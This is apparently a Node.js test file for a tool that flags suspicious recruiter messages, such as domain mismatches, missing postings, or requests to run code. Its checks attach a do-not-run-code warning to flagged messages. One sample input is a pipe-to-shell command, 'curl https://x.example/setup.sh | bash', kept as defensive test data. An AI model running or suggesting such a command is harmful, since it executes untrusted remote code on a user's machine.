import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { assessRecruiterSignal, RUN_CODE_WARNING } from "../src/core/evaluate/recruiter-signal.mjs";

test("a message from the company's own domain with a posting is clear", () => {
  const r = assessRecruiterSignal({
    senderEmail: "Pat Lee <pat@careers.acme.com>",
    companyDomain: "https://www.acme.com/jobs",
    publicPosting: true,
    text: "Hi, would you like to talk Thursday about the role you applied for?",
  });
  assert.equal(r.verdict, "clear");
  assert.equal(r.warning, null);
});

test("a domain mismatch is suspect and carries the do-not-run-code warning", () => {
  const r = assessRecruiterSignal({
    senderEmail: "pat@acme-careers.io",
    companyDomain: "acme.com",
    text: "Great background. Please complete the take-home.",
  });
  assert.equal(r.verdict, "suspect");
  assert.ok(r.signals.some((s) => s.id === "domain-mismatch"));
  assert.equal(r.warning, RUN_CODE_WARNING);
  assert.match(r.warning, /Do not run/);
});

test("no public posting is suspect on its own", () => {
  const r = assessRecruiterSignal({
    senderEmail: "pat@acme.com",
    companyDomain: "acme.com",
    publicPosting: false,
  });
  assert.equal(r.verdict, "suspect");
  assert.ok(r.signals.some((s) => s.id === "no-public-posting"));
});

test("asking you to clone and run a repo is flagged for any field", () => {
  for (const text of [
    "Clone the repo at github.com/x/test and run npm install, then send a screenshot.",
    "Please download the attached zip archive and run the installer.",
    "Paste this: curl https://x.example/setup.sh | bash",
    "Install our interview meeting software before the call.",
  ]) {
    const r = assessRecruiterSignal({ senderEmail: "a@acme.com", companyDomain: "acme.com", text });
    assert.equal(r.verdict, "suspect", text);
    assert.equal(r.warning, RUN_CODE_WARNING, text);
  }
});

test("one mild signal alone stays clear, two together are suspect", () => {
  assert.equal(
    assessRecruiterSignal({ senderEmail: "pat@gmail.com", text: "Hello, are you open to a chat?" })
      .verdict,
    "clear"
  );
  const r = assessRecruiterSignal({
    senderEmail: "pat@gmail.com",
    text: "Message me on Telegram.",
  });
  assert.equal(r.verdict, "suspect");
});

test("skills tell the agent to run the check and carry the warning", () => {
  for (const path of [
    ".agents/skills/evaluate-job/SKILL.md",
    ".agents/skills/email-comms/SKILL.md",
  ]) {
    const text = readFileSync(new URL(`../${path}`, import.meta.url), "utf8");
    assert.match(text, /RECRUITER SIGNAL/, path);
    assert.match(text, /Do not run, install or open any code/, path);
  }
});

test("recruiter-check CLI prints the flag and the warning", async () => {
  const { spawnSync } = await import("node:child_process");
  const { fileURLToPath } = await import("node:url");
  const root = fileURLToPath(new URL("..", import.meta.url));
  const run = spawnSync(
    process.execPath,
    [
      `${root}/bin/careerrat.mjs`,
      "recruiter-check",
      "--sender",
      "x@evil.example",
      "--company-domain",
      "acme.com",
      "--posting",
      "missing",
      "--json",
    ],
    { encoding: "utf8", env: { PATH: process.env.PATH, CAREERRAT_NO_UPDATE_CHECK: "1" } }
  );
  assert.equal(run.status, 0, run.stderr);
  const out = JSON.parse(run.stdout);
  assert.equal(out.verdict, "suspect");
  assert.equal(out.warning, RUN_CODE_WARNING);
});
